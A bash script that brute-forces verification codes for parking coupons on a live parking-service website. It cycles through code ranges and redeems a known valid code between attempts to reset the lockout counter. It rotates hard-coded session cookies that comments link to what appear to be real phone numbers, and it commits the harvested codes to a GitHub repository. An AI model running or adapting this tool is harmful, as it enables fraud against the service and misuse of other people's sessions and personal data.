#!/bin/bash
ck=$1;shift; n1=$1;shift; n2=$1;shift;

# const param
id_k="BkPTdVZaOYaoML6UwMGJyg=="
id_h="ZT5pUv4JKL1tomT0u9SEdA=="

#result
res_code=""
resfile=tmpResultCode.tmp
gitlogfile=crontab.log
gitcodefile=vcode.txt
#ok inf
ok_code=242
ok_id="${id_k}"

query_park()
{
    p_c=$1;shift;
    p_code=$1;shift;
    p_id=$1;shift;

    curl -L "http://wx.parkingwang.com/coupon/coupon_show?coupon=${p_id}&verification=${p_code}" \
    -H "Cookie: parking_ses=${p_c}" \
    -H 'Connection: keep-alive' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' \
    -H 'Referer: http://wx.parkingwang.com/coupon/input_code?coupon_id=BkPTdVZaOYaoML6UwMGJyg==' \
    -H 'Accept-Encoding: gzip, deflate' \
    -H 'Accept-Language: zh-CN,zh;q=0.9' \
    -H 'misctooltoken: c6d1ad2b9afs4fbab56aaa3e0267deb9' --compressed 2>&1 | egrep "(alert)|(span)" | paste -s -d ":" -
}

parse_res()
{
    p_res=$1;shift;
    if echo "${p_res}" | grep -q "请输入车牌"
    then
        echo "res:success"
    elif echo "${p_res}" | grep -q "输入您的手机号码"
    then
        echo "res:fail:ck:login"
    elif echo "${p_res}" | grep -q "输入错误验证码次数过多"
    then
        echo "res:fail:ck:block"
    elif echo "${p_res}" | grep -q "请求参数错误"
    then
        echo "res:fail:id:param"
    elif echo "${p_res}" | grep -q "优惠券不存在"
    then
        p_n=`echo "${p_res}" | egrep  "(优惠券不存在)" | grep -o "[0-9]次" | grep -o "[0-9]"`
        [ "${p_n}x" == "x" ] && p_n="x"
        echo "res:fail:code:${p_n}"
    elif echo "${p_res}" | grep -q "没有优惠券了"
    then
        p_n=`echo "${p_res}" | egrep  "(没有优惠券了)" | grep -o "[0-9]次" | grep -o "[0-9]"`
        [ "${p_n}x" == "x" ] && p_n="x"
        echo "res:fail:code:${p_n}"
    else
        echo ${p_res}
    fi
}

check_park()
{
    p_c=$1;shift;
    p_code=$1;shift;
    p_id=$1;shift;

    # BkPTdVZaOYaoML6UwMGJyg==
    # ZT5pUv4JKL1tomT0u9SEdA==
    [ "${p_code}x" == "x" ] && p_code="${ok_code}"
    [ "${p_id}x" == "x" ] && p_id="${ok_id}"
    #echo "ck=#${p_c}# code=#${p_code}# id=#${p_id}#"

    p_html=`query_park ${p_c} ${p_code} ${p_id}`
    parse_res "${p_html}"
}

do_try()
{
    p_ck=$1;shift;
    p_code=$1;shift;
    p_s=`check_park ${p_ck} ${p_code} ${id_h}`
    if echo "${p_s}" | grep -q "res:success"
    then
        echo -n -e " [\\033[32m\\033[1m$(printf "%3d" ${p_code})\\033[0m]"
        res_code="${res_code}${p_code} "
    else
        ns=`echo "${p_s}" | grep "res:fail:code" | cut -d ":" -f 4`
        [ "${ns}z" == "z" ] && ns="Q"
        [ "${ns}z" == "xz" ] && echo -n -e " \\033[31m\\033[1m$(printf "%3d" ${p_code})\\033[0m|${ns}" || echo -n " $(printf "%3d" ${p_code})|${ns}"
   fi
}

sendgit()
{
    p_file=$1;shift;
    p_linen=$1;shift;
    p_msg=$*

    p_dir=~/work/code/github/board
    p_tmpfile="tmp_${p_file}.tmp"
    p_gittime=`date +"%Y-%m-%d %H:%M:%S"`

    echo "${p_gittime} ${p_msg}" | cat - ${p_dir}/${p_file} | head -n ${p_linen} > ${p_tmpfile}
    cat ${p_tmpfile} > ${p_dir}/${p_file}
    cd ${p_dir} && git commit -a -m "add line by cmd" && cd -
    cd ${p_dir} && git push && cd -
}
loggit()
{
    p_msg=$*
    sendgit ${gitlogfile} 50 ${p_msg}
}
savegit()
{
    p_msg=$*
    sendgit ${gitcodefile} 7 ${p_msg}
}

# ckinfo 392a777819e640839d2d838a2855239f239a53f4 15263819410 20191023
# ckinfo ef74b1cf95139da7ce9d19ce02113a2f5914f71c 17128240042 20191023
# ckinfo 24a6af824b90763b738663e64464c682ed5d09ad 17128240164 20191023
# ckinfo a75ef402921948a497acdb38b0bef33c5b245e90 18866478794 20191023
#
# ckinfo 25c04bd9b5b7e78a44f5546219dacd1d2fa8913f 13001077534 20191014 1023 slow
# ckinfo 892972fd5a016156bfad33c119ce1283a801e3f6 13521838587 20191020 1023 x
# ckinfo 4a961a7390091a410675839e8d4622bf8b37fef7 17109324204 20191020 1023 x
# ckinfo 6a0b36cde3bf78babfce15b8da8af79dc694b231 18515987963 20190901 1023 x
# ckinfo 364beeb9d67580f6ab8f1906e36f576a7ff3925d 18866674180 20191023 1023 x
# ckinfo 8db19b98f9f8e97820da19772e77875d90407413 18866674211 20191023 1023 x
#
#如果速度很慢，重新登录换一个Cookie

# test cookie
ck_set="
392a777819e640839d2d838a2855239f239a53f4
ef74b1cf95139da7ce9d19ce02113a2f5914f71c
24a6af824b90763b738663e64464c682ed5d09ad
a75ef402921948a497acdb38b0bef33c5b245e90
"
best_ck=""
besk_ckt=999
ck_OK_n=0
for ick in ${ck_set}
do
    cks1=`date +%s`
    check_park ${ick} | grep -q "res:fail:ck" && ck_flag="n" || ck_flag="Y"
    cks2=`date +%s`
    ck_t=$((cks2-cks1))
    echo -n "[$(printf "%3d" ${ck_t})] ${ck_flag} ${ick}"
    [ "${ck_flag}x" == "Yx" ] && ck_OK_n=$((ck_OK_n+1))
    [ "${ck_flag}x" == "Yx" -a \( ${ck_t} -lt ${besk_ckt} -o "${best_ck}x" == "x" \) ] && { besk_ckt=${ck_t}; best_ck="${ick}"; echo " U"; } || { echo " -"; }
done
echo "ckN:${ck_OK_n} T:${besk_ckt} ${best_ck}"

[ "${ck}x" == "x" ] && ck="${best_ck}"
[ "${n1}x" == "x" ] && n1=1
[ "${n2}x" == "x" ] && n2=999
echo -n -e "\\033[32m\\033[1m$ BEGIN \\033[0m "; date +"%Y-%m-%d %H:%M:%S"; echo " begin=${n1} end=${n2} ck=${ck}"
if [ "${ck}x" == "x" ]
then
    errExitMsg="ckN=${ck_OK_n} T=${besk_ckt} err=noValidCk"
    echo "${errExitMsg}"
    loggit "${errExitMsg}"
    exit 1
fi

cfm_okN=0
cfm_failN=0
cfm_checkRes=""
ok_code_bak=""
touch ${resfile}
for i in `cat ${resfile}`
do
    s=`check_park ${ck} ${i} ${id_h}`
    if echo "${s}" | grep -q "res:success" 
    then
        ok_code_bak=${i}
        cfm_okN=$((cfm_okN+1))
        res_code="${res_code}${i} "
        cfm_checkRes="${cfm_checkRes}[${i}]<ok>"
    else
        cfm_failN=$((cfm_failN+1))
        cfm_checkRes="${cfm_checkRes}[${i}]<fail>"
    fi
done
cfm_passFlag="no"
needSaveGitCode="no"
if [ ${cfm_okN} -ge 1 ]
then
    if [ ${cfm_okN} -ge 2 -o ${cfm_failN} -eq 0 ]
    then
        cfm_passFlag="yes"
        [ ${cfm_failN} -gt 0 ] && needSaveGitCode="yes"
    fi
fi
logTxt="ckN=${ck_OK_n} T=${besk_ckt} codeN=${cfm_okN}:${cfm_failN} checkPass=${cfm_passFlag} syncGit=${needSaveGitCode} checkRes=${cfm_checkRes} ck=${ck}"

# check ok_code and ok_id
check_park ${ck} ${ok_code} ${ok_id} | grep -q "res:success" && logTxt="Kcode=${ok_code} ${logTxt}" || ok_code=""
[ "${ok_code}x" == "x" -a "${ok_code_bak}x" != "x" ] && { ok_code=${ok_code_bak}; ok_id="${id_h}"; logTxt="Hcode=${ok_code} ${logTxt}"; }
[ "${ok_code}x" == "x" ] && logTxt="err=noValidOkCode ${logTxt}"

# send by github
echo ${logTxt}
loggit ${logTxt}

# exit if no ok_code can use
if [ "${ok_code}x" == "x" ]
then
    exit 1
fi

# reset ck
for ick in ${ck_set}
do
    check_park ${ick} ${ok_code} ${ok_id} | grep -q "res:success" && echo "[RST] Y ok_code=${ok_code} ck=${ick}" || echo "[RST] n ok_code=${ok_code} ck=${ick}"
done

if [ "${cfm_passFlag}x" == "yesx" ]
then
    # sync code to git if need
    if [ "${needSaveGitCode}x" == "yesx" ]
    then
        echo "${res_code}" > ${resfile}
        savegit ${res_code}
    fi
    exit 0
fi



meter_d1=`date +"%Y-%m-%d %H:%M:%S"`
meter_n=0
ctrl_ln=30
ctrl_lc=0
echo -n `date +%H:%M:%S`
for i in `seq ${n1} 3 ${n2}`
do 
    j=${i}
    # reset code
    rstSucFlag="false"
    for idxRst in `seq 1 9`
    do
        check_park ${ck} ${ok_code} ${ok_id} | grep -q "res:success" && { echo -n " Y${idxRst}"; rstSucFlag="success"; break; } || echo "<${idxRst}>"
    done
    [ "${rstSucFlag}x" != "successx" ] && { echo " Fail"; exit 1; }
    
    do_try ${ck} ${j}; meter_n=$((meter_n+1)); ctrl_lc=$((ctrl_lc+1)); j=$((j+1));
    do_try ${ck} ${j}; meter_n=$((meter_n+1)); ctrl_lc=$((ctrl_lc+1)); j=$((j+1));
    do_try ${ck} ${j}; meter_n=$((meter_n+1)); ctrl_lc=$((ctrl_lc+1)); j=$((j+1));
    if [ ${ctrl_lc} -ge ${ctrl_ln} ]
    then
        echo ""
        echo -n `date +%H:%M:%S`
        ctrl_lc=0
    fi
done
meter_d2=`date +%Y-%m-%d#%H:%M:%S`
echo ""
res_code=`echo "${res_code}" | grep "[0-9]\+" -o | sort -n | uniq | paste -s -d " " -`
echo "beginT=${meter_d1} endT=${meter_d2} n=${meter_n} res_code=${res_code}"
echo "${res_code}" > ${resfile}


# send by github
savegit ${res_code}

